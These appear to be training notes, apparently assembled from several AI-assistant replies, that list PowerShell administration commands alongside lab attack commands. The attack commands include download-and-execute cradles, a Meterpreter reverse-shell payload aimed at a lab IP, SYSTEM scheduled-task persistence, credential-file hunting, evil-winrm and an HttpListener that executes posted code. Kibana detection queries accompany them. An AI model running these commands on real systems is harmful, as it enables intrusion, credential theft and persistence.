### CDAH-M11L5-PowerShell System Administration

Here is a list of every PowerShell command (cmdlet) mentioned in m11-m15_commands.md, along with syntax examples and descriptions of their switches/parameters:

---

### 1. Get-WinEvent

**Purpose:** Retrieves event logs from local or remote computers.

**Syntax Examples:**
```powershell
# List all event log providers on a remote computer
Get-WinEvent -ComputerName bp-wkstn-10 -ListLog * | Format-Table LogName, IsEnabled

# Detailed info for a specific log provider
Get-WinEvent -ComputerName bp-wkstn-10 -ListLog Microsoft-Windows-PowerShell/Operational | Format-List -Property *

# List all logs from a specific provider
Get-WinEvent -ComputerName bp-wkstn-10 -LogName Microsoft-Windows-PowerShell/Operational
```

**Key Parameters:**
- `-ComputerName <String>`: Specifies the target computer.
- `-ListLog <String>`: Lists event log providers (use * for all).
- `-LogName <String>`: Specifies the log name to query.
- Other parameters: `-MaxEvents`, `-FilterXPath`, `-FilterHashtable`, `-Credential`, etc.

---

### 2. Get-Process

**Purpose:** Retrieves information about processes running on a local (or remote) computer.

**Syntax Examples:**
```powershell
# List all processes with specific fields
Get-Process | Format-Table Id, Name, Path

# Detailed information on specific processes
Get-Process conhost, lsass | Format-List *

# Get version info for a process
Get-Process conhost -FileVersionInfo 2>$null
```

**Key Parameters:**
- `-Name <String[]>`: Process names to retrieve.
- `-Id <Int32[]>`: Process IDs to retrieve.
- `-FileVersionInfo`: Returns file version information.
- Other parameters: `-ComputerName`, `-Module`, `-IncludeUserName`, etc.

---

### 3. Get-Service

**Purpose:** Retrieves status of services on a local (or remote) computer.

**Syntax Examples:**
```powershell
# List all running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# List running services starting with 'net'
Get-Service -Name "net*" | Where-Object {$_.Status -eq "Running"}

# Details for a specific service
Get-Service -Name Netlogon | Format-List *
```

**Key Parameters:**
- `-Name <String[]>`: Service names (wildcards supported).
- `-DisplayName <String[]>`: Service display names.
- `-RequiredServices`: Lists required services.
- Other parameters: `-DependentServices`, `-ComputerName`, etc.

---

### 4. Get-HotFix

**Purpose:** Displays installed hotfixes on a local or remote computer.

**Syntax Examples:**
```powershell
# All hotfixes on a remote computer
Get-HotFix -ComputerName bp-wkstn-9

# Security hotfixes, sorted
Get-HotFix -Description Security* -ComputerName bp-wkstn-9 | Sort-Object -Property InstalledOn

# Details about a specific hotfix
Get-HotFix -Id KB2847927 -ComputerName bp-wkstn-9 | Format-List *
```

**Key Parameters:**
- `-ComputerName <String[]>`: Remote computer(s).
- `-Id <String[]>`: Hotfix ID(s), e.g., KB123456.
- `-Description <String>`: Description filter (supports wildcards).
- `-ServicePack <String>`: Service pack filter.

---

### 5. Get-Help

**Purpose:** Displays help for cmdlets.

**Syntax Example:**
```powershell
Get-Help Get-HotFix
```

**Key Parameters:**
- `-Name <String>`: Name of the cmdlet to get help for.
- `-Detailed`, `-Full`, `-Examples`, etc.

---

### 6. Get-GPO

**Purpose:** Retrieves Group Policy Objects in a domain.

**Syntax Example:**
```powershell
Get-GPO -All -Domain "energy.lan"
```

**Key Parameters:**
- `-All`: Retrieves all GPOs.
- `-Domain <String>`: Domain to query.
- `-Name <String>`: GPO name.
- `-Guid <Guid>`: GPO GUID.

---

### 7. New-GPO

**Purpose:** Creates a new GPO.

**Syntax Example:**
```powershell
New-GPO -Name "ScreenSaverTimeout" -Comment "This sets the screen saver timeout to 5min."
```

**Key Parameters:**
- `-Name <String>`: Name of the new GPO.
- `-Comment <String>`: Description.
- `-Domain <String>`: Domain in which to create.

---

### 8. Set-GPRegistryValue

**Purpose:** Sets a registry-based policy in a GPO.

**Syntax Example:**
```powershell
Set-GPRegistryValue -Name "ScreenSaverTimeout" -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop" -ValueName ScreenSaveTimeOut -Type String -Value 300
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-Key <String>`: Registry key.
- `-ValueName <String>`: Registry value name.
- `-Type <String>`: Value type (e.g., String, DWord).
- `-Value <Object>`: Value to set.

---

### 9. New-GPLink

**Purpose:** Links a GPO to an OU or domain.

**Syntax Example:**
```powershell
New-GPLink -Name "ScreenSaverTimeout" -Target "ou=bp,dc=energy,dc=lan"
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-Target <String>`: OU or domain to link.

---

### 10. Get-GPOReport

**Purpose:** Generates a report for a GPO.

**Syntax Example:**
```powershell
Get-GPOReport -Name "ScreenSaverTimeout" -ReportType HTML -Path "C:\Users\trainee\Desktop\gporeport.html"
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-ReportType <String>`: Report format (HTML, XML).
- `-Path <String>`: Output file path.

---

### 11. Get-Module

**Purpose:** Lists modules loaded in the current session or available on the system.

**Syntax Example:**
```powershell
Get-Module
```

**Key Parameters:**
- `-Name <String[]>`: Module name(s).
- `-ListAvailable`: List all available modules.

---

### 12. Get-Command

**Purpose:** Lists cmdlets and functions.

**Syntax Example:**
```powershell
Get-Command
```

**Key Parameters:**
- `-Name <String[]>`: Command name(s).
- `-Module <String[]>`: Filter by module.
- `-CommandType <CommandTypes>`: E.g., Cmdlet, Function.

---

### 13. Get-Item

**Purpose:** Gets an item at a specified location (e.g., file or registry key).

**Syntax Example:**
```powershell
Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
```

**Key Parameters:**
- `-Path <String[]>`: Path(s) to the item.

---

### 14. New-ItemProperty

**Purpose:** Creates a new property for an item (e.g., registry entry).

**Syntax Example:**
```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad" -Value "%windir%\system32\notepad.exe"
```

**Key Parameters:**
- `-Path <String>`: Path to the item.
- `-Name <String>`: Property name.
- `-Value <Object>`: Value to set.

---

### 15. Remove-ItemProperty

**Purpose:** Deletes a property from an item.

**Syntax Example:**
```powershell
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad"
```

**Key Parameters:**
- `-Path <String>`: Path to item.
- `-Name <String>`: Property name.

---

### 16. Get-NetFirewallProfile

**Purpose:** Gets firewall profiles on the local computer.

**Syntax Example:**
```powershell
Get-NetFirewallProfile -All
```

**Key Parameters:**
- `-Name <String[]>`: Profile name(s) (Domain, Private, Public).
- `-All`: All profiles.

---

### 17. Get-NetFirewallRule

**Purpose:** Gets firewall rules.

**Syntax Examples:**
```powershell
# All rules in the domain profile
Get-NetFirewallProfile -Name Domain | Get-NetFirewallRule

# Get a specific rule
Get-NetFirewallRule -DisplayName "Block Outbound Port 1337"
```

**Key Parameters:**
- `-DisplayName <String[]>`: Rule display names.
- `-Name <String[]>`: Rule names.
- Filtering, e.g., `-Direction`, `-Profile`, etc.

---

### 18. New-NetFirewallRule

**Purpose:** Creates a new firewall rule.

**Syntax Example:**
```powershell
New-NetFirewallRule -DisplayName "Block Outbound Port 1337" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Block -Profile Domain
```

**Key Parameters:**
- `-DisplayName <String>`: Name for the rule.
- `-Direction <Direction>`: Inbound/Outbound.
- `-LocalPort <UInt16[]>`: Port(s).
- `-Protocol <String>`: Protocol (TCP/UDP).
- `-Action <Action>`: Allow/Block.
- `-Profile <String[]>`: Network profile(s).

---

### 19. Disable-NetFirewallRule

**Purpose:** Disables a firewall rule.

**Syntax Example:**
```powershell
Disable-NetFirewallRule -DisplayName "Block Outbound Port 1337"
```

**Key Parameters:**
- `-DisplayName <String[]>`: Rule display names.
- `-Name <String[]>`: Rule names.

---

If you need expanded parameter lists or more details for any specific cmdlet, let me know!

### CDAH-M12L1-Weaponizing PowerShell & Attack Frameworks

Here are all the PowerShell and Linux commands found in m11-m15_dump.md, along with explanations, syntax examples, and any switches/parameters used:

---

## PowerShell Commands

### 1. Invoke-AtomicTest

- **Description:** Runs Atomic Red Team tests for a specific MITRE ATT&CK technique.
- **Syntax Example:**  
  Invoke-AtomicTest T1059.001 -ShowDetailsBrief  
  Invoke-AtomicTest T1059.001 -CheckPrereqs  
  Invoke-AtomicTest T1059.001
- **Parameters/Switches:**
  - T1059.001 — Specifies the technique ID to test.
  - -ShowDetailsBrief — Shows a brief summary of available tests.
  - -CheckPrereqs — Checks if the prerequisites for each test are met.

---

### 2. cd (Change Directory)

- **Description:** Changes the current directory.
- **Syntax Example:**  
  cd /home/trainee/unicorn

---

### 3. sed

- **Description:** Stream editor for filtering and transforming text (Linux).
- **Syntax Example:**  
  sed -z -i 's/\n/\r\n/g;s/powershell/powershell -noprofile/g' powershell_attack.txt
- **Parameters/Switches:**
  - -z — Treats input as a set of lines separated by ASCII NUL.
  - -i — Edits files in-place.

---

### 4. Out-File

- **Description:** Sends output to a file.
- **Syntax Example:**  
  $string | Out-File -FilePath $profile -Append
- **Parameters/Switches:**
  - -FilePath — Specifies the file to write to.
  - -Append — Appends to the file instead of overwriting.

---

### 5. echo

- **Description:** Displays a string or variable's value.
- **Syntax Example:**  
  echo $profile

---

### 6. Test-Path

- **Description:** Checks if a path exists.
- **Syntax Example:**  
  Test-Path $profile

---

### 7. New-Item

- **Description:** Creates a new item (file or folder).
- **Syntax Example:**  
  New-Item -Path $profile -Type file -Force
- **Parameters/Switches:**
  - -Path — Specifies the path.
  - -Type — Type of item (file/folder).
  - -Force — Creates item even if it exists.

---

### 8. Invoke-WebRequest

- **Description:** Downloads content from the web.
- **Syntax Example:**  
  (Invoke-WebRequest -URI "http://199.63.64.51:8000/powershell_attack.txt").Content | Out-File -FilePath "C:\Windows\Temp\launch.bat"
- **Parameters/Switches:**
  - -URI — The URL to download from.

---

### 9. Start-Process

- **Description:** Starts a new process.
- **Syntax Example:**  
  Start-Process -FilePath "powershell" -ArgumentList "-noprofile -command `"IEX(GC C:\Windows\Temp\launch.bat -Raw)`""
- **Parameters/Switches:**
  - -FilePath — Executable to run.
  - -ArgumentList — Arguments to pass.

---

### 10. Get-Content

- **Description:** Reads content from a file.
- **Syntax Example:**  
  Get-Content C:\Users\trainee\Documents\backup_pass.txt

---

### 11. Set-ExecutionPolicy

- **Description:** Changes the user preference for the PowerShell script execution policy.
- **Syntax Example:**  
  Set-ExecutionPolicy Bypass

---

### 12. . (Dot Sourcing)

- **Description:** Loads a PowerShell script into the current session.
- **Syntax Example:**  
  . .\PowerView.ps1

---

### 13. Find-InterestingFile (PowerView function)

- **Description:** Searches for files that may contain credentials.
- **Syntax Example:**  
  Find-InterestingFile -Path "C:\Users"
- **Parameters/Switches:**
  - -Path — Path to search under.

---

### 14. $credentials = Get-Credential

- **Description:** Prompts for credentials and stores them in a variable.
- **Syntax Example:**  
  $credentials = Get-Credential

---

### 15. $session = New-PSSession

- **Description:** Creates a persistent PowerShell session to a remote computer.
- **Syntax Example:**  
  $session = New-PSSession -ComputerName eng-wkstn-2 -Credential $credentials
- **Parameters/Switches:**
  - -ComputerName — Name of remote computer.
  - -Credential — Credentials object.

---

### 16. Enter-PSSession

- **Description:** Starts an interactive session with a remote computer.
- **Syntax Example:**  
  Enter-PSSession $session

---

## Linux/Metasploit/Evil-WinRM Commands

### 1. ./unicorn.py

- **Description:** Generates shellcode payloads for PowerShell attacks.
- **Syntax Example:**  
  ./unicorn.py windows/meterpreter/reverse_https 199.63.64.51 5555

---

### 2. sudo msfconsole -r unicorn.rc

- **Description:** Starts Metasploit Console loading a resource script.
- **Syntax Example:**  
  sudo msfconsole -r unicorn.rc

---

### 3. python3 -m http.server

- **Description:** Starts a simple HTTP server in the current directory.
- **Syntax Example:**  
  python3 -m http.server

---

### 4. sessions -i 1 (Metasploit)

- **Description:** Interacts with a specific Metasploit session.
- **Syntax Example:**  
  sessions -i 1

---

### 5. load stdapi (Meterpreter)

- **Description:** Loads the stdapi extension in Meterpreter for standard commands.
- **Syntax Example:**  
  meterpreter > load stdapi

---

### 6. upload (Meterpreter)

- **Description:** Uploads a file to the target machine.
- **Syntax Example:**  
  meterpreter > upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "C:\Windows\Temp\PowerView.ps1"

---

### 7. shell (Meterpreter)

- **Description:** Opens a shell on the victim machine.
- **Syntax Example:**  
  meterpreter > shell

---

### 8. evil-winrm

- **Description:** Evil-WinRM is a tool for remote access to Windows using WinRM.
- **Syntax Example:**  
  evil-winrm -i 172.16.4.3 -u "john.doe"
- **Parameters/Switches:**
  - -i — Target IP address.
  - -u — Username.

---

## Kibana/ElasticSearch Queries

- **event.code:1 and process.executable :*powershell.exe and process.parent.executable :*powershell.exe**  
  Finds PowerShell processes started by other PowerShell processes.

- **event.code:4104 and message:"*PowerView*"**  
  Finds script block execution logs containing PowerView.

- **event.code: 4648 and winlog.event_data.TargetInfo:HTTP***  
  Finds logons with explicit credentials for HTTP (WinRM).

- **event.code: 91**  
  Finds WinRM resource allocation events.

- **event.code: 4624 and winlog.event_data.LogonType:3**  
  Finds successful network logons (potential lateral movement).

---

Here’s a summary of all the commands found in the file m11-m15_dump .md from lukasaq/hack-class, including descriptions, syntax examples, and the relevant switches/parameters:

---

## 1. Invoke-RestMethod (PowerShell)

**Description:**  
A PowerShell cmdlet used to send HTTP and REST API requests (GET, POST, etc.) from scripts or the command line, and receive the responses. Supports headers, body data, authentication, proxies, and more.

**Syntax Example (GET):**
```powershell
$response = Invoke-RestMethod  http://site.com/people/1
```

**Syntax Example (GET with Headers):**
```powershell
$headers = New-Object "System.Collections.Generic.Dictionary[String,String]"
$headers.Add("X-DATE", '9/29/2014')
$headers.Add("X-SIGNATURE", '234j123l4kl23j41l23k4j')
$headers.Add("X-API-KEY", 'testuser')
$response = Invoke-RestMethod 'http://site.com/people/1' -Headers $headers
```

**Syntax Example (POST with JSON Body):**
```powershell
$person = @{
   name='steve'
}
$json = $person | ConvertTo-Json
$response = Invoke-RestMethod 'http://site.com/people/1' -Method Post -Body $json -ContentType 'application/json'
```

**Common Parameters & Switches:**

- -Uri (or first unnamed parameter): Target URL
- -Method: GET (default), POST, PUT, DELETE, etc.
- -Headers: Dictionary/hashtable of HTTP headers
- -Body: Content to send (e.g., JSON, XML)
- -ContentType: MIME type (e.g., application/json)
- -Proxy, -Credential, -TimeoutSec, etc.

---

## 2. schtasks (Windows Command-Line)

**Description:**  
Schedules and manages tasks to run programs or scripts periodically or in response to specific events in Windows.

**General Syntax:**
```cmd
schtasks /create [options]
```

**Examples:**

- Run at every system start after a certain date:
  ```cmd
  schtasks /create /tn My App /tr c:\apps\myapp.exe /sc onstart /sd 03/15/2020
  ```
- Run with system permissions on the 15th of each month:
  ```cmd
  schtasks /create /tn My App /tr c:\apps\myapp.exe /sc monthly /d 15 /ru System
  ```
- Create remote task to run every 10 days:
  ```cmd
  schtasks /create /s SRV01 /tn My App /tr c:\apps\myapp.exe /sc daily /mo 10
  ```
- Run on specific event (Event ID 4647 - user logs off):
  ```cmd
  SCHTASKS /Create /TN test2 /RU system /TR c:\apps\myapp.exe /SC ONEVENT /EC Security /MO "*[System[Provider[@Name='Microsoft Windows security auditing.'] and EventID=4647]]"
  ```

**Key Switches & Parameters:**

- /create           : Create a new scheduled task
- /tn <name>        : Task name
- /tr <path>        : Task to run (full path)
- /sc <schedule>    : Schedule type (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT)
- /sd <date>        : Start date
- /d <day>          : Day (for monthly)
- /ru <user>        : Run as user (System, etc.)
- /s <computer>     : Target computer (for remote)
- /mo <modifier>    : Modifier (interval, or event filter)
- /ec <log>         : Event log (e.g., Security)
- /?                : Show help

---

## 3. PowerShell JSON Utilities

**Description:**  
Convert PowerShell objects to and from JSON, often used with REST APIs.

**Syntax Example:**
```powershell
ConvertTo-Json
# Usage:
$json = $person | ConvertTo-Json
```
- Converts a PowerShell object to JSON format.

**To save query results to a JSON file:**
```powershell
$results | ConvertTo-Json -Compress | Set-Content <File Path\FileName.json>
```

- -Compress: Minifies the JSON output.

---

## 4. Example ElasticSearch Query (not a direct command, but REST API usage)

**Description:**  
The file shows how to compose queries for ElasticSearch using RESTful syntax, which can be run via Dev Tools (in Elastic UI), cURL, or PowerShell (with Invoke-RestMethod).

**Example Query:**
```json
GET _search
{
  "query": {
    "bool": {
      "must": [
        {"match":{"winlog.event_id.keyword":"8"}},
        {"match":{"agent.name":"eng-wkstn-3"}},
        {"range":{
          "@timestamp":{
            "gte":"2022-04-19T00:30:00.000Z",
            "lte":"2022-04-19T23:30:00.000Z"
          }
        }}
      ]
    }
  }
}
```
This is typically sent as the body in a REST API request.

---

## Summary Table

| Command                | Description                                                                 | Syntax Example (see above)                | Key Switches/Parameters (see above)      |
|------------------------|-----------------------------------------------------------------------------|-------------------------------------------|------------------------------------------|
| Invoke-RestMethod      | PowerShell cmdlet for HTTP/REST requests                                    | GET/POST with -Headers/-Body/-ContentType | -Uri, -Method, -Headers, -Body, etc.     |
| schtasks               | Windows command-line task scheduler                                         | /create /tn /tr /sc /sd /ru /mo           | See full list above                      |
| ConvertTo-Json         | PowerShell utility to convert objects to JSON                               | -Compress                                 | -Compress                                |
| Set-Content            | PowerShell cmdlet to write output to a file                                 |                                           | File path                                |

---

Do you want detailed tables of parameters for schtasks or Invoke-RestMethod? If so, specify which command or both.
---

Let me know if you want detailed examples for any specific command or further breakdowns!

### CDAH-M12L2-Exploiting PowerShell Autoruns ###

Here are the PowerShell commands mentioned in the file, along with example syntax and a breakdown of switches and parameters used:

---

### 1. Set-ExecutionPolicy

**Example Syntax:**
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
```
- `Bypass`: The execution policy to set (can also be Restricted, RemoteSigned, Unrestricted, etc.).
- `-Scope CurrentUser`: Applies the policy change to the current user only.
- `-Force`: Suppresses user prompts, forces the command to execute.

---

### 2. New-Item

**Example Syntax:**
```powershell
New-Item -Path $PROFILE -Type File -Force
```
- `-Path $PROFILE`: Specifies the path to create the new item (here, the user's PowerShell profile).
- `-Type File`: Specifies the type of item to create (in this case, a file).
- `-Force`: Overwrites the file if it already exists.

---

### 3. start (Start-Process/Start command)

**Example Syntax:**
```powershell
start C:\Users\trainee\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```
- Launches the specified file (here, opens the profile file in the default editor).

---

### 4. Get-Service | Get-Member

**Example Syntax:**
```powershell
Get-Service | Get-Member
```
- `Get-Service`: Retrieves the status of services on a local or remote machine.
- `|`: Pipes the output to another command.
- `Get-Member`: Lists the properties and methods of the objects output from `Get-Service`.

---

### 5. Copy-Item

**Example Syntax:**
```powershell
Copy-Item C:\Users\trainee\Documents\Microsoft.PowerShell_profile.ps1 C:\Users\trainee\Documents\WindowsPowerShell\ -Force
```
- `Copy-Item <Source> <Destination>`: Copies an item from one location to another.
- `-Force`: Overwrites the destination file if it already exists.

---

### 6. Clear-Content

**Example Syntax:**
```powershell
Clear-Content C:\Users\trainee\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
```
- Removes all content from the specified file but leaves the file itself intact.

---

### 7. Import-Module

**Example Syntax:**
```powershell
Import-Module C:\Users\trainee\Documents\acCOMplice\COMHijackToolkit.ps1
```
- Loads a PowerShell module from the specified path.

---

### 8. Find-MissingLibraries

**Example Syntax:**
```powershell
Find-MissingLibraries
```
- This appears to be a custom function or command provided by the imported module. No parameters are shown in the example.

---

If you want a detailed explanation or help with any specific command, let me know!

---

Here are the PowerShell commands found in the file, along with syntax examples that include switches and parameters:

---

### 1. Invoke-WebRequest / Invoke-RestMethod

#### Syntax Example:
```powershell
Invoke-WebRequest -Uri "http://1.2.3.4/index.html"
Invoke-RestMethod -Uri "http://1.2.3.4/index.html" -Method POST -Body "data"
```
**Switches/parameters:**  
- -Uri <url>
- -Method <GET|POST|PUT|DELETE>
- -Body <data>

---

### 2. .NET WebClient (DownloadFile/DownloadString)

#### Syntax Example:
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://1.2.3.4/index.html", "C:\path\to\file")
(New-Object System.Net.WebClient).DownloadString("http://1.2.3.4/index.html")
```
**Switches/parameters:**  
- URL to download  
- Destination path (for DownloadFile)

---

### 3. System.Net.HttpListener (Create a Web Server)

#### Syntax Example:
```powershell
$http = New-Object System.Net.HttpListener
$http.Prefixes.Add("http://127.0.0.1:8080/")
$http.Start()
# ... handle requests/responses ...
$http.Stop()
```
**Switches/parameters:**  
- Prefixes.Add("http://IP:PORT/")

---

### 4. Invoke-Expression

#### Syntax Example:
```powershell
Invoke-Expression $Command
"get-process" | Invoke-Expression
```
**Switches/parameters:**  
- String/command to execute

---

### 5. PowerShell.exe with Options

#### Syntax Example:
```powershell
PowerShell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -uri http://199.63.64.31/index.html).content"
PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring("http://1.2.3.4/index.html"))'
PowerShell.exe -encodedCommand "Base64String"
```
**Switches/parameters:**  
- -ExecutionPolicy <policy>
- -Command <string>
- -WindowStyle <hidden|normal>
- -NoLogo
- -NonInteractive
- -ep <policy> (short for -ExecutionPolicy)
- -nop (short for -NoProfile)
- -encodedCommand <Base64String>

---

### 6. Base64 Encoding/Decoding

#### Syntax Example:
```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('get-process'))
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
powershell.exe -encodedCommand "Base64String"
```
**Switches/parameters:**  
- Base64 string as input

---

### 7. PowerShell Aliases

#### Syntax Example:
```powershell
sal block-website iwr
block-website -uri http://1.2.3.4
iex (iwr 1.2.3.4/index.html).Content
```
**Switches/parameters:**  
- Alias name
- Parameters as per the original cmdlet

---

### 8. Schtasks (Task Scheduler Command)

#### Syntax Example:
```powershell
schtasks /create /tn OfficeUpdaterA /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ..." /sc onlogon /ru SYSTEM
```
**Switches/parameters:**  
- /create
- /tn <task_name>
- /tr <task_run_command>
- /sc <schedule>
- /ru <run_as_user>

---

### 9. Curl (used in workflow)

#### Syntax Example:
```bash
curl -X POST -H "Content-type: text/plain" --data-binary @/path/to/payload.ps1 http://199.63.64.31:42000/
```
**Switches/parameters:**  
- -X <method>
- -H <header>
- --data-binary @<file>
- <URL>

---

### 10. Shortened PowerShell Webserver (one-liner)

#### Syntax Example:
```powershell
[Net.HttpListener]::new()|%{
  $_.Prefixes.Add("http://0.0.0.0:8080/");
  $_.Start();
  $c=$_.GetContext();
  iex ([IO.StreamReader]::new($c.Request.InputStream)).ReadToEnd();
  $c.Response.OutputStream.Close();
  $_.stop()
}
```
**Switches/parameters:**  
- Prefixes.Add
- Start/Stop methods

---

If you want syntax or parameter details for any specific command, let me know!

---


































































